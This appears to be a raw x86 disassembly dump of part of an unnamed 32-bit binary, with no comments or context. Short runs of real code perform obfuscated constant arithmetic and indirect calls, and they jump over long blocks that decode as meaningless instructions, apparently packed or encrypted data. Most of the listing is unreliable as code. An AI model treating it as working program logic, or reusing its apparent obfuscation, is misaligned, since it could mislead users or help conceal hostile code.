  4059e9:	mov    edx,0xcfbc2871
  4059ee:	(bad)  
  4059ef:	sub    al,0x6f
  4059f1:	into   
  4059f2:	and    eax,0x59c432b9
  4059f7:	in     al,dx
  4059f8:	push   es
  4059f9:	hlt    
  4059fa:	mov    cl,0x85
  4059fc:	cmp    al,BYTE PTR [ecx+ecx*4+0x253deced]
  405a03:	sub    esp,ecx
  405a05:	in     eax,0xcf
  405a07:	rcr    ch,1
  405a09:	fst    DWORD PTR [ecx+0x67f0bba1]
  405a0f:	aas    
  405a10:	mov    dh,BYTE PTR ds:0x6ac60b90
  405a16:	ror    ebx,cl
  405a18:	adc    al,0x1
  405a1a:	dec    edi
  405a1b:	shl    DWORD PTR [edi],1
  405a1d:	cdq    
  405a1e:	or     BYTE PTR [esi],bh
  405a20:	and    ecx,DWORD PTR [edx]
  405a22:	idiv   DWORD PTR [esi+0x6b460f72]
  405a28:	fidivr WORD PTR [eax]
  405a2a:	fnstsw WORD PTR [edx-0x770a378f]
  405a30:	add    edi,DWORD PTR [esi+0x748aa791]
  405a36:	mov    al,0x82
  405a38:	cmp    eax,0x5d717d37
  405a3d:	xchg   ebp,eax
  405a3e:	jle    0x405aa1
  405a40:	popa   
  405a41:	push   esi
  405a42:	mov    ebp,0x44be1d0f
  405a47:	test   DWORD PTR [edi+0x9],edx
  405a4a:	or     al,0x19
  405a4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a4d:	pop    eax
  405a4e:	out    dx,eax
  405a4f:	mov    cl,0xc7
  405a51:	inc    ebp
  405a52:	clc    
  405a53:	xor    DWORD PTR [ebp-0x1d7e0764],eax
  405a59:	jnp    0x405ad4
  405a5b:	add    BYTE PTR [eax],al
  405a5d:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  405a64:	and    edx,edx
  405a66:	mov    eax,DWORD PTR [ebp-0x4]
  405a69:	sbb    ecx,DWORD PTR ds:0x42fd05
  405a6f:	push   esi
  405a70:	mov    esi,DWORD PTR [ebp-0x8]
  405a73:	and    DWORD PTR ds:0x42fcf1,0x0
  405a7d:	jmp    0x405a8f
  405a82:	mov    edx,DWORD PTR ds:0x42fcf1
  405a88:	inc    edx
  405a89:	mov    DWORD PTR ds:0x42fcf1,edx
  405a8f:	cmp    DWORD PTR ds:0x42fcf1,0x17
  405a96:	jae    0x405b0b
  405a9c:	cmp    DWORD PTR ds:0x42fcf1,0x1d
  405aa3:	jne    0x405ab5
  405aa9:	push   DWORD PTR [ebp-0x24]
  405aac:	push   DWORD PTR [ebp-0x20]
  405aaf:	call   DWORD PTR ds:0x42e2db
  405ab5:	jmp    0x405a82
  405aba:	mov    DWORD PTR ds:0x42fcd9,0x14
  405ac4:	cmp    DWORD PTR ds:0x42fcd9,0x0
  405acb:	je     0x405b0b
  405ad1:	cmp    DWORD PTR ds:0x42fcd9,0x16
  405ad8:	jne    0x405af7
  405ade:	push   DWORD PTR [ebp-0x14]
  405ae1:	push   0x2e3f
  405ae6:	push   DWORD PTR [ebp-0x18]
  405ae9:	push   DWORD PTR [ebp-0x18]
  405aec:	push   0x8cdb
  405af1:	call   DWORD PTR ds:0x42e537
  405af7:	xor    edx,edx
  405af9:	xor    edx,DWORD PTR ds:0x42fcd9
  405aff:	dec    edx
  405b00:	mov    DWORD PTR ds:0x42fcd9,edx
  405b06:	jmp    0x405ac4
  405b0b:	mov    edx,0x7510855
  405b10:	add    DWORD PTR ds:0x42fcd1,edi
  405b16:	xor    eax,edx
  405b18:	and    DWORD PTR ds:0x42e6f7,ebx
  405b1e:	xor    esi,edx
  405b20:	mov    ecx,0x32729c
  405b25:	add    esi,ecx
  405b27:	add    eax,ecx
  405b29:	imul   eax,esi
  405b2c:	mov    esi,DWORD PTR [ebp+0xc]
  405b2f:	cmp    esi,eax
  405b31:	jne    0x405b4d
  405b37:	mov    eax,DWORD PTR [ebp-0x4]
  405b3a:	mov    esi,DWORD PTR [ebp-0x8]
  405b3d:	xor    eax,edx
  405b3f:	xor    esi,edx
  405b41:	add    eax,ecx
  405b43:	add    esi,ecx
  405b45:	imul   eax,esi
  405b48:	jmp    0x405e5b
  405b4d:	mov    eax,DWORD PTR [ebp+0xc]
  405b50:	mov    eax,DWORD PTR [eax+0x78]
  405b53:	mov    DWORD PTR [ebp+0xc],eax
  405b56:	mov    eax,DWORD PTR [ebp-0x4]
  405b59:	mov    esi,DWORD PTR [ebp-0x8]
  405b5c:	xor    eax,edx
  405b5e:	xor    esi,edx
  405b60:	add    eax,ecx
  405b62:	add    esi,ecx
  405b64:	imul   eax,esi
  405b67:	mov    esi,DWORD PTR [ebp+0xc]
  405b6a:	cmp    esi,eax
  405b6c:	mov    eax,DWORD PTR [ebp-0x4]
  405b6f:	je     0x405b3a
  405b75:	jmp    0x405e48
  405b7a:	xchg   DWORD PTR [ebx-0xdac0d75],edi
  405b80:	imul   esi,DWORD PTR gs:[eax+0x3],0x5f6d624d
  405b88:	dec    esi
  405b89:	cmp    BYTE PTR [edx+esi*1+0x7eaa7070],al
  405b90:	jo     0x405c02
  405b92:	mov    WORD PTR ds:0x857c1718,?
  405b98:	adc    al,0x9d
  405b9a:	enter  0x2870,0x4c
  405b9e:	popf   
  405b9f:	sbb    eax,0xda2dc9f3
  405ba4:	sub    BYTE PTR [eax+0x52],al
  405ba7:	push   ds
  405ba8:	mul    DWORD PTR [esi+edi*8+0x1eb94ba4]
  405baf:	or     ebp,esi
  405bb1:	xchg   edx,eax
  405bb2:	fdiv   st,st(3)
  405bb4:	adc    BYTE PTR [eax],0x67
  405bb7:	mov    ebp,edx
  405bb9:	stos   DWORD PTR es:[edi],eax
  405bba:	sbb    dl,BYTE PTR [esi-0x1c]
  405bbd:	xchg   esp,eax
  405bbe:	and    ecx,DWORD PTR [edx-0x30bc7dce]
  405bc4:	fild   WORD PTR [edx-0x4]
  405bc7:	mov    ch,0x32
  405bc9:	iret   
  405bca:	push   0x2cb8e572
  405bcf:	cld    
  405bd0:	(bad)  
  405bd1:	rol    ebp,1
  405bd3:	sahf   
  405bd4:	ret    0x6ed1
  405bd7:	bound  eax,QWORD PTR [eax+0x1fa80776]
  405bdd:	xchg   esp,eax
  405bde:	into   
  405bdf:	jno    0x405b88
  405be1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405be2:	xor    DWORD PTR [edx+0x10],esp
  405be5:	and    al,0x46
  405be7:	mov    BYTE PTR [eax+0x811eba9],0x87
  405bee:	shl    DWORD PTR [edx-0x5ded5691],cl
  405bf4:	and    ebp,ecx
  405bf6:	jbe    0x405bec
  405bf8:	sar    BYTE PTR [ebx+0x7d],0x13
  405bfc:	jns    0x405c6b
  405bfe:	inc    ebp
  405bff:	test   al,0xc3
  405c01:	adc    DWORD PTR [esi+0x39],0xb7e20489
  405c08:	jns    0x405bc3
  405c0a:	test   al,0x1b
  405c0c:	imul   eax,DWORD PTR [ebx+0x2a],0x232c5503
  405c13:	jns    0x405c12
  405c15:	cs inc ebp
  405c17:	(bad)  
  405c18:	push   0x65
  405c1a:	and    DWORD PTR [edi+0xc309843],edi
  405c20:	adc    edx,DWORD PTR ds:0x199707b7
  405c26:	pop    es
  405c27:	push   cs
  405c28:	mov    bh,0xb7
  405c2a:	pop    edi
  405c2b:	jmp    0x405bfa
  405c2d:	adc    DWORD PTR [edi],ecx
  405c2f:	adc    eax,0x9b5b36eb
  405c34:	sub    DWORD PTR [edi],edi
  405c36:	jmp    0x405bed
  405c38:	loope  0x405c9e
  405c3a:	jo     0x405c99
  405c3c:	adc    eax,0x80a9bc6f
  405c41:	pop    ebp
  405c42:	cmp    eax,0x67fbb354
  405c47:	sbb    bl,cl
  405c49:	(bad)  
  405c4a:	es mov ah,0x16
  405c4d:	imul   esp,eax,0xffffffda
  405c50:	dec    edi
  405c51:	xchg   ecx,eax
  405c52:	add    eax,0x70cb02b6
  405c57:	push   eax
  405c58:	cmp    ecx,DWORD PTR [eax-0x53b7a109]
  405c5e:	or     eax,0x54b587d
  405c63:	xor    eax,0x24ab8cfb
  405c69:	dec    eax
  405c6b:	mov    bl,0x78
  405c6d:	cmp    BYTE PTR [eax+0x19bcc2e5],ah
  405c73:	popa   
  405c74:	push   ss
  405c75:	xor    ah,BYTE PTR [edi+0x139e0647]
  405c7b:	xchg   esi,eax
  405c7c:	or     ebx,ecx
  405c7e:	mov    es,WORD PTR [ebx-0x3d5debdd]
  405c84:	push   ebp
  405c85:	retf   0xe752
  405c88:	inc    ebx
  405c89:	(bad)  
  405c8a:	jae    0x405c9c
  405c8c:	sbb    al,0xec
  405c8e:	jb     0x405c34
  405c90:	out    dx,al
  405c91:	pop    es
  405c92:	or     DWORD PTR [eax-0x29],esp
  405c95:	sahf   
  405c96:	cmp    DWORD PTR [ecx-0xe],0xffffffd1
  405c9a:	fisttp WORD PTR [eax+0x59942d21]
  405ca0:	cmc    
  405ca1:	test   al,0x37
  405ca3:	push   ecx
  405ca4:	dec    ebx
  405ca5:	jb     0x405c28
  405ca7:	and    eax,0x340f4dd5
  405cac:	jl     0x405ca0
  405cae:	mov    ds:0x4341a4ad,al
  405cb3:	lock addr16 std 
  405cb6:	jle    0x405c88
  405cb8:	loopne 0x405c53
  405cba:	lods   al,BYTE PTR ds:[esi]
  405cbb:	dec    esp
  405cbc:	and    esp,0xd3efe0c1
  405cc2:	stc    
  405cc3:	inc    edi
  405cc4:	std    
  405cc5:	mov    DWORD PTR [eax+0x15b636bc],ebp
  405ccb:	push   es
  405ccc:	out    dx,eax
  405ccd:	add    esi,DWORD PTR [ecx+esi*2-0x65107ca1]
  405cd4:	pushf  
  405cd5:	shl    DWORD PTR [ebx-0x71],cl
  405cd8:	aas    
  405cd9:	and    DWORD PTR [ecx+0x27],eax
  405cdc:	in     al,0x5d
  405cde:	push   ds
  405cdf:	test   DWORD PTR ds:0x91e2c5de,edx
  405ce5:	and    edx,edx
  405ce7:	lock adc al,0x5b
  405cea:	leave  
  405ceb:	cmp    al,0xb7
  405ced:	std    
  405cee:	leave  
  405cef:	dec    edx
  405cf0:	mov    esp,0x740a5f87
  405cf5:	stc    
  405cf6:	leave  
  405cf7:	neg    edx
  405cf9:	loop   0x405d19
  405cfb:	test   BYTE PTR [esi],dh
  405cfd:	or     cl,BYTE PTR ds:0xecccd2be
  405d03:	mov    al,ds:0xdd061187
  405d08:	stos   BYTE PTR es:[edi],al
  405d09:	js     0x405cfc
  405d0b:	sub    al,0x9e
  405d0d:	adc    DWORD PTR [eax-0x3],ebx
  405d10:	and    BYTE PTR [edi-0x19],ah
  405d13:	push   es
  405d14:	sti    
  405d15:	cwde   
  405d16:	inc    eax
  405d17:	xor    DWORD PTR [ecx],esi
  405d19:	or     edi,DWORD PTR [ecx+0x4b16bc29]
  405d1f:	data16 aas 
  405d21:	jg     0x405cbb
  405d23:	sub    eax,0x5b191986
  405d28:	dec    ebx
  405d29:	pop    edx
  405d2a:	mov    bh,0x87
  405d2c:	rcl    BYTE PTR [eax-0x76],1
  405d2f:	sub    eax,ebx
  405d31:	pushf  
  405d32:	(bad)  
  405d33:	gs sub eax,0x3e38a92b
  405d39:	dec    esi
  405d3a:	sahf   
  405d3b:	push   edi
  405d3c:	sub    dl,BYTE PTR [ecx+0x44]
  405d3f:	lock jg 0x405cd2
  405d42:	xor    al,0xdd
  405d44:	mov    bl,0xaf
  405d46:	ret    0xcfe7
  405d49:	cmp    bh,al
  405d4b:	es mov ebx,0x71846008
  405d51:	aad    0x7d
  405d53:	jmp    0x5359:0x1881eca
  405d5a:	repnz and al,BYTE PTR [ebx]
  405d5d:	loop   0x405d90
  405d5f:	adc    al,0xd3
  405d61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d62:	add    edx,eax
  405d64:	cmp    DWORD PTR [edx],0x6f
  405d67:	add    DWORD PTR [ebx],ecx
  405d69:	test   BYTE PTR [eax+0x39],0x3c
  405d6d:	mov    edx,0x4cd23464
  405d72:	sbb    dh,BYTE PTR [ebp-0x171c7649]
  405d78:	pop    esi
  405d79:	sub    al,0x11
  405d7b:	and    bl,0x16
  405d7e:	or     al,al
  405d80:	mov    BYTE PTR [ecx+0x7150241f],al
  405d86:	jl     0x405dad
  405d88:	cld    
  405d89:	ror    DWORD PTR [esi+0x21bfd5f4],cl
  405d8f:	shr    ebp,0xcb
  405d92:	retf   
  405d93:	jp     0x405d52
  405d95:	leave  
  405d96:	lods   eax,DWORD PTR ds:[esi]
  405d97:	out    0xa3,eax
  405d99:	push   esi
  405d9a:	jp     0x405dd2
  405d9c:	icebp  
  405d9d:	sbb    ebx,esp
  405d9f:	or     BYTE PTR [ecx+edx*2+0x20],bl
  405da3:	sbb    ebp,DWORD PTR [eax-0x2ac73040]
  405da9:	lea    edi,[esi]
  405dab:	clc    
  405dac:	xchg   ebp,eax
  405dad:	and    DWORD PTR [edi+0x7dec0329],edi
  405db3:	arpl   WORD PTR [esi+0x36aba462],si
  405db9:	jnp    0x405da7
  405dbb:	jno    0x405e08
  405dbd:	push   cs
  405dbe:	mov    cl,0xf7
  405dc0:	adc    eax,esi
  405dc2:	(bad)  
  405dc3:	xchg   ecx,eax
  405dc4:	loopne 0x405dd2
  405dc6:	dec    ecx
  405dc7:	imul   esp,esp,0x8ed5a175
  405dcd:	es stos BYTE PTR es:[edi],al
  405dcf:	push   0x20
  405dd1:	sbb    edx,eax
  405dd3:	fs push es
  405dd5:	mov    ebx,0x82747902
  405dda:	int    0x4f
  405ddc:	fs dec edi
  405dde:	lods   eax,DWORD PTR ds:[esi]
  405ddf:	xchg   esi,eax
  405de0:	mov    eax,0x49e1fa9c
  405de5:	shl    BYTE PTR [ebx],0x69
  405de8:	loop   0x405e2c
  405dea:	and    BYTE PTR [edx],ch
  405dec:	cmp    al,0x2e
  405dee:	fldenv [eax+0x7]
  405df1:	cmp    DWORD PTR [edi],esp
  405df3:	std    
  405df4:	or     al,0x36
  405df6:	outs   dx,DWORD PTR ds:[esi]
  405df7:	pop    eax
  405df8:	in     eax,0xee
  405dfa:	jb     0x405d8a
  405dfc:	int    0x96
  405dfe:	add    ecx,esp
  405e00:	lods   al,BYTE PTR ds:[esi]
  405e01:	sbb    ebx,DWORD PTR [esi+0x40121795]
  405e07:	mov    DWORD PTR [edi-0x28c64ccc],edi
  405e0d:	loope  0x405de6
  405e0f:	xlat   BYTE PTR ds:[ebx]
  405e10:	pop    edx
  405e11:	jecxz  0x405e47
  405e13:	das    
  405e14:	cmovs  esi,DWORD PTR [ebx-0x3d]
  405e18:	iret   
  405e19:	xor    esp,DWORD PTR [eax-0x10]
  405e1c:	inc    esp
  405e1d:	sbb    eax,0xf0b5c43
  405e22:	int    0xd2
  405e24:	(bad)  
  405e25:	and    DWORD PTR [ecx-0x184eb204],ecx
  405e2b:	dec    ebx
  405e2c:	mov    al,ds:0x7df94f7e
  405e31:	rcr    BYTE PTR [eax+0x7b],1
  405e34:	(bad)  
  405e35:	les    ebp,FWORD PTR [esi+0x7eca87c2]
  405e3b:	push   0x70
  405e3d:	test   al,0x8d
  405e3f:	or     eax,0xe720358
  405e44:	jecxz  0x405e7d
  405e46:	mov    dh,0xce
  405e48:	xor    eax,edx
  405e4a:	add    eax,ecx
  405e4c:	mov    ecx,DWORD PTR [ebp+0xc]
  405e4f:	imul   eax,ecx
  405e52:	add    eax,DWORD PTR [ebp+0x8]
  405e55:	mov    DWORD PTR [ebp+0xc],eax
  405e58:	mov    eax,DWORD PTR [ebp+0xc]
  405e5b:	pop    esi
  405e5c:	leave  
  405e5d:	ret    0x8
  405e60:	push   ebp
  405e61:	mov    ebp,esp
  405e63:	push   ecx
  405e64:	add    DWORD PTR ds:0x42e70f,0x1508
  405e6e:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  405e75:	mov    eax,DWORD PTR [ebp-0x4]
  405e78:	mov    edx,DWORD PTR [ebp+0x10]
  405e7b:	adc    DWORD PTR ds:0x42e6ef,0x4006
  405e85:	mov    ecx,0x7510855
  405e8a:	xor    DWORD PTR ds:0x42fd01,0x260
  405e94:	xor    eax,ecx
  405e96:	jmp    0x40605c
  405e9b:	fidiv  DWORD PTR [edx+0x7b]
  405e9e:	jle    0x405e33
  405ea0:	jne    0x405e7b
  405ea2:	jb     0x405e2d
  405ea4:	(bad)  
  405ea5:	(bad)  
  405ea6:	sub    al,0xdc
  405ea8:	inc    ebx
  405ea9:	pop    esi
  405eaa:	js     0x405eea
  405eac:	aas    
  405ead:	jo     0x405f1f
  405eaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405eb0:	jg     0x405f22
  405eb2:	jo     0x405eac
  405eb4:	add    cl,0xae
  405eb7:	mov    eax,ecx
  405eb9:	push   eax
  405eba:	mov    esp,0x921d2238
  405ebf:	lods   al,BYTE PTR ds:[esi]
  405ec0:	sub    edx,eax
  405ec2:	cld    
  405ec3:	(bad)  
  405ec4:	je     0x405ec3
  405ec6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ec7:	mov    dh,0x20
  405ec9:	aam    0x1c
  405ecb:	mov    bh,0x8e
  405ecd:	pop    ecx
  405ece:	jmp    0x405f32
  405ed0:	out    dx,eax
  405ed1:	xor    cl,BYTE PTR [ecx]
  405ed3:	cmc    
  405ed4:	jb     0x405e8a
  405ed6:	loop   0x405ea6
  405ed8:	shr    BYTE PTR [ebx-0x26],1
  405edb:	and    dh,dh
  405edd:	cmp    BYTE PTR [edx],dh
  405edf:	jb     0x405eea
  405ee1:	dec    esp
  405ee2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ee3:	popf   
  405ee4:	stos   BYTE PTR es:[edi],al
  405ee5:	mov    edx,0xc6091340
  405eea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405eeb:	loop   0x405f26
  405eed:	mov    bl,0x75
  405eef:	jl     0x405e74
  405ef1:	jnp    0x405f62
  405ef3:	sub    dh,BYTE PTR [ecx+0x2e]
  405ef6:	nop
  405ef7:	mov    eax,ds:0xa5a6026e
  405efc:	cli    
  405efd:	dec    edi
  405efe:	xor    eax,0x6ffa7d5
  405f03:	pop    edi
  405f04:	stos   DWORD PTR es:[edi],eax
  405f05:	out    dx,eax
  405f06:	hlt    
  405f07:	fimul  WORD PTR [edi-0x4d17fba5]
  405f0d:	stc    
  405f0e:	popf   
  405f0f:	retf   
  405f10:	iret   
  405f11:	mov    esp,0x26898741
  405f16:	mov    eax,ds:0x8ca5d115
  405f1b:	adc    BYTE PTR [esi],0xe
  405f1e:	mov    BYTE PTR [ebp+0x27a9754f],cl
  405f24:	lahf   
  405f25:	cmp    edi,DWORD PTR [eax+0x15]
  405f28:	mov    BYTE PTR [ebx],bl
  405f2a:	jmp    0x405fab
  405f2c:	dec    edx
  405f2d:	jbe    0x405f5f
  405f2f:	adc    eax,0xee62eb91
  405f34:	retf   0xecd1
  405f37:	fld    QWORD PTR [edi]
  405f39:	aad    0x66
  405f3b:	rep stos BYTE PTR es:[edi],al
  405f3d:	(bad)  
  405f3e:	div    DWORD PTR [edi+0x9]
  405f41:	cli    
  405f42:	lods   eax,DWORD PTR ds:[esi]
  405f43:	push   ds
  405f44:	xchg   esp,eax
  405f45:	sti    
  405f46:	mov    eax,0xc0ad7faa
  405f4b:	cmp    cl,dh
  405f4d:	sub    al,0x68
  405f4f:	sbb    DWORD PTR [ebx],ecx
  405f51:	(bad)  
  405f52:	xchg   ebp,eax
  405f53:	ds push ds
  405f55:	or     cl,BYTE PTR [eax-0x41c80386]
  405f5b:	(bad)  
  405f5d:	adc    al,BYTE PTR [edx-0x31]
  405f60:	neg    ah
  405f62:	mov    cl,0x98
  405f64:	in     eax,dx
  405f65:	jb     0x405f9e
  405f67:	mov    ebp,0x605602f4
  405f6c:	mov    ch,0xdb
  405f6e:	sbb    al,BYTE PTR [edi+0xa1b2c7d]
  405f74:	and    ch,BYTE PTR [eax+esi*1-0x22]
  405f78:	mov    dl,0x3a
  405f7a:	pop    esi
  405f7b:	or     BYTE PTR [edi-0x171babe1],dh
  405f81:	mov    esp,edi
  405f83:	leave  
  405f84:	add    esi,DWORD PTR [ebp-0x2e953e0e]
  405f8a:	aad    0xbc
  405f8c:	xchg   edx,eax
  405f8d:	push   es
  405f8e:	sub    esp,ecx
  405f90:	mov    ebp,0xb1b66618
  405f95:	push   esi
  405f96:	sar    dl,1
  405f98:	cmc    
  405f99:	jae    0x40600c
  405f9b:	inc    eax
  405f9c:	shr    edi,1
  405f9e:	ftst   
  405fa0:	aam    0xe6
  405fa2:	inc    ebp
  405fa3:	sar    DWORD PTR [ebp-0x14],0x19
  405fa7:	jle    0x405fa5
  405fa9:	fstp   QWORD PTR [ebx-0x26]
  405fac:	inc    ebx
  405fad:	lock cmp esp,edi
  405fb0:	mov    esp,0xa6c9e40
  405fb5:	mov    DWORD PTR [edx+0x1a],0xe35091c9
  405fbc:	push   ebx
  405fbd:	call   0x3de2:0xab3ac42b
  405fc4:	test   al,0x78
  405fc6:	gs out 0x88,eax
  405fc9:	inc    edx
  405fca:	adc    BYTE PTR [ebx],dl
  405fcc:	sub    ebp,ebp
  405fce:	cmp    cl,BYTE PTR [ecx+0xcd0ddf9]
  405fd4:	jmp    0xb530:0x8dabde6c
  405fdb:	and    DWORD PTR [edx+0x7],eax
  405fde:	push   es
  405fdf:	pop    edi
  405fe0:	and    BYTE PTR [ecx-0x646a970e],ch
  405fe6:	or     DWORD PTR [ecx+0x2b],eax
  405fe9:	push   ds
  405fea:	(bad)  
  405feb:	add    ecx,ecx
  405fed:	and    ebp,DWORD PTR [edx+0x42]
  405ff0:	popa   
  405ff1:	lods   eax,DWORD PTR ds:[esi]
  405ff2:	repz (bad) [ecx-0x39]
  405ff6:	std    
  405ff7:	fsub   st,st(5)
  405ff9:	dec    ecx
  405ffa:	(bad)  
  405ffb:	stc    
  405ffc:	cwde   
  405ffd:	icebp  
  405ffe:	ret    0x5d22
  406001:	cmp    edx,0xffffffa8
  406004:	out    0x56,eax
  406006:	cwde   
  406007:	out    0x68,eax
  406009:	pop    ecx
  40600a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40600b:	jecxz  0x40606b
  40600d:	push   0x93a2dbba
  406012:	aaa    
  406013:	xor    ebp,ebx
  406015:	xchg   ebp,eax
  406016:	mov    ebx,0x6beb79e
  40601b:	icebp  
  40601c:	ss cli 
  40601e:	dec    esp
  40601f:	(bad)  
  406020:	cmc    
  406021:	fs push eax
  406023:	jbe    0x406034
  406025:	arpl   WORD PTR [esi+edx*2],ax
  406028:	fcmovnb st,st(3)
  40602a:	cmp    eax,0xdbae7c94
  40602f:	adc    DWORD PTR [edx-0x5ea2bac],esp
  406035:	inc    edx
  406036:	push   0x1c
  406038:	aaa    
  406039:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40603a:	(bad)  
  40603b:	fstp   TBYTE PTR ds:0x52eb517d
  406041:	sbb    al,0xbf
  406043:	cmp    al,0xd8
  406045:	cmp    BYTE PTR ds:0xc1902560,bl
  40604b:	pop    esi
  40604c:	loop   0x405fe2
  40604e:	je     0x405ffc
  406050:	mov    al,0xab
  406052:	sbb    al,0x56
  406054:	xchg   ebp,eax
  406055:	or     al,0x9b
  406057:	pop    edi
  406058:	push   cs
  406059:	cmp    edx,DWORD PTR [ebx+0x7f]
  40605c:	add    eax,0x32729c
  406061:	or     DWORD PTR ds:0x42fd86,0xae4
  40606b:	mov    DWORD PTR [edx],eax
  40606d:	mov    eax,DWORD PTR [ebp+0xc]
  406070:	xor    eax,ecx
  406072:	push   esi
  406073:	sbb    edx,DWORD PTR ds:0x42e118
  406079:	mov    esi,DWORD PTR [ebp+0x10]
  40607c:	or     DWORD PTR ds:0x42fd76,edx
  406082:	mov    edx,0x32729c
  406087:	sbb    DWORD PTR ds:0x42fcf1,0x42e11c
  406091:	add    eax,edx
  406093:	adc    DWORD PTR ds:0x42fcd1,0x42e6fb
  40609d:	mov    DWORD PTR [esi+0x4],eax
  4060a0:	sbb    eax,0x6979
  4060a5:	mov    eax,DWORD PTR [ebp+0x14]
  4060a8:	adc    DWORD PTR ds:0x42fd82,0x2335
  4060b2:	mov    esi,DWORD PTR [ebp+0x10]
  4060b5:	sub    DWORD PTR ds:0x42fcd5,0x1c02
  4060bf:	mov    DWORD PTR [esi+0x8],eax
  4060c2:	or     eax,DWORD PTR ds:0x42fd05
  4060c8:	jmp    0x40628e
  4060cd:	out    dx,al
  4060ce:	hlt    
  4060cf:	arpl   WORD PTR [edx],dx
  4060d1:	popa   
  4060d2:	xchg   ecx,eax
  4060d3:	ins    DWORD PTR es:[edi],dx
  4060d4:	hlt    
  4060d5:	(bad)  
  4060d6:	pop    esp
  4060d7:	xor    eax,0xb37c1596
  4060dc:	xchg   esi,eax
  4060dd:	gs ds jo 0x406151
  4060e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060e2:	jg     0x406154
  4060e4:	jo     0x406154
  4060e6:	pop    eax
  4060e7:	pop    ebp
  4060e8:	mov    al,ds:0xcd9e743
  4060ed:	push   0x5d3b29f4
  4060f2:	sub    DWORD PTR [eax-0x1e46e188],eax
  4060f8:	sub    eax,0xcaba877f
  4060fd:	xor    dl,BYTE PTR [eax]
  4060ff:	loopne 0x40615d
  406101:	mov    ds:0x5dd45469,eax
  406106:	inc    BYTE PTR [ebp+0x18205b35]
  40610c:	mov    al,0x27
  40610e:	mov    ebx,0xb6c0af39
  406113:	cmp    DWORD PTR [eax],edi
  406115:	js     0x4060ce
  406117:	test   al,0xfa
  406119:	push   ebp
  40611a:	push   eax
  40611b:	mov    bh,0xc
  40611d:	sub    esi,DWORD PTR [edi-0x711d167c]
  406123:	call   0x707f:0xf782caf1
  40612a:	int3   
  40612b:	xor    eax,0xf6bdaeab
  406130:	loopne 0x406133
  406132:	cmp    DWORD PTR [edi],ecx
  406134:	and    dl,BYTE PTR ds:0xf8528e2a
  40613a:	xchg   DWORD PTR [ebp+0x3ce38117],esi
  406140:	dec    ecx
  406141:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406142:	int3   
  406143:	repz push es
  406145:	in     al,dx
  406146:	aam    0x13
  406148:	sbb    BYTE PTR [ebp+eax*2-0x7f],bl
  40614c:	sbb    eax,0x4544631a
  406151:	(bad)  
  406152:	jb     0x406178
  406154:	lods   al,BYTE PTR ds:[esi]
  406155:	dec    ebp
  406156:	enter  0x5acb,0xa9
  40615a:	test   BYTE PTR [edx],ch
  40615c:	test   BYTE PTR [edx],bh
  40615e:	lea    eax,[edx-0x6e]
  406161:	test   al,0x55
  406163:	cmp    DWORD PTR [ebx-0x7c],esi
  406166:	(bad)  
  406167:	fsub   QWORD PTR [edi+edx*4-0x66]
  40616b:	jmp    0x34e2:0x3285d06a
  406172:	addr16 dec ecx
  406174:	(bad)  
  406175:	test   eax,0xc82cf978
  40617a:	pushf  
  40617b:	or     al,0xfb
  40617d:	lods   al,BYTE PTR ds:[esi]
  40617e:	icebp  
  40617f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406180:	dec    ebx
  406181:	ja     0x406176
  406183:	add    eax,0x4ac3fd81
  406188:	sub    edx,DWORD PTR [ebx+0x6fb18d80]
  40618e:	adc    al,0x56
  406190:	sbb    DWORD PTR [edi],0x3d
  406193:	dec    edx
  406194:	push   edi
  406195:	mov    BYTE PTR [eiz*2-0x375ffa5a],al
  40619c:	in     eax,0xf
  40619e:	cs hlt 
  4061a0:	stos   DWORD PTR es:[edi],eax
  4061a1:	fmul   QWORD PTR [ebx]
  4061a3:	or     al,0x7
  4061a5:	sub    bh,BYTE PTR [esi+esi*2]
  4061a8:	xchg   esi,eax
  4061a9:	mov    edx,0xd62b827f
  4061ae:	pusha  
  4061af:	clc    
  4061b0:	push   0xffffffe7
  4061b2:	jge    0x4061b2
  4061b4:	dec    eax
  4061b5:	add    dl,cl
  4061b7:	xor    ebp,ebp
  4061b9:	or     DWORD PTR [ecx+0x79],ebx
  4061bc:	inc    esp
  4061bd:	inc    ecx
  4061be:	xor    esp,edi
  4061c0:	cwde   
  4061c1:	ret    
  4061c2:	dec    esp
  4061c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4061c4:	add    DWORD PTR [ebx],esp
  4061c6:	jp     0x40618a
  4061c8:	sbb    edi,0x5a
  4061cb:	(bad)  
  4061cd:	ret    
  4061ce:	pop    edi
  4061cf:	xchg   ebx,eax
  4061d0:	push   ds
  4061d1:	mov    ss,esi
  4061d3:	fcom   QWORD PTR [edi]
  4061d5:	popf   
  4061d6:	mov    al,ds:0xf6cb77d9
  4061db:	mov    cl,0x4d
  4061dd:	jmp    0x40624f
  4061df:	repz mov esi,0xc20c229d
  4061e5:	add    al,0x65
  4061e7:	in     eax,dx
  4061e8:	fdivr  st,st(0)
  4061ea:	idiv   BYTE PTR [ecx]
  4061ec:	scas   al,BYTE PTR es:[edi]
  4061ed:	and    al,0x1b
  4061ef:	mov    bl,BYTE PTR [ebx+0x65]
  4061f2:	adc    DWORD PTR [edx+0x37],ecx
  4061f5:	enter  0x548a,0xe7
  4061f9:	inc    cl
  4061fb:	xlat   BYTE PTR ds:[ebx]
  4061fc:	out    0x2c,eax
  4061fe:	fs int3 
  406200:	pop    edx
  406201:	scas   al,BYTE PTR es:[edi]
  406202:	push   0x17
  406204:	cmp    esi,0xffffffcf
  406207:	aam    0xd9
  406209:	or     BYTE PTR [edi+ebx*2-0x4ca77607],al
  406210:	repz and al,0xa6
  406213:	outs   dx,DWORD PTR ds:[esi]
  406214:	xor    ecx,DWORD PTR [eax-0x1f5eb1f3]
  40621a:	fimul  WORD PTR [ebx]
  40621c:	cmp    BYTE PTR [esi-0x41],bl
  40621f:	cld    
  406220:	dec    eax
